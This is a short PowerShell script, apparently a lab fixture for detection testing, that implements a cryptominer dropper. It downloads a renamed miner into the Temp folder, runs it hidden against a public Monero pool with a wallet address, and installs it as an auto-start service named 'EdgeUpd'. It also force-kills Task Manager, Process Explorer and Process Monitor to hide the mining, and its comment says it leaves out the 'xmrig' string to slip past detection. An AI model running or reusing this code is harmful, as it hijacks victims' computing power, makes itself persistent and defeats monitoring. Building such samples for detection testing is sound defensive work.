# Lab fixture: renamed-miner service installer (kryptex pool class).
# A PowerShell dropper fetches a renamed miner into Temp, points it at a
# public pool, registers the Temp image as an auto-start service, and kills
# analysis tools to conceal mining. No xmrig token anywhere.
$edge = "$env:TEMP\edge.exe"
(New-Object Net.WebClient).DownloadFile("http://127.0.0.1:8080/e", $edge)
Start-Process -FilePath $edge -ArgumentList "--algo=rx/0 --url=xmr.kryptex.network:8029 --user 4MASi45ub7Qe4ZE36UT5G6cU4ud8Fhhe4deS4F3cw9KTAb8dLcukC7edhDQ7cn5d4gEYkbUrMWeWQLGsCmrG6dLaYyNoVKf" -WindowStyle Hidden
sc.exe create EdgeUpd binPath= "$env:TEMP\msedge.exe" start= auto
taskkill /F /IM taskmgr.exe
taskkill /F /IM procexp.exe
taskkill /F /IM procmon.exe
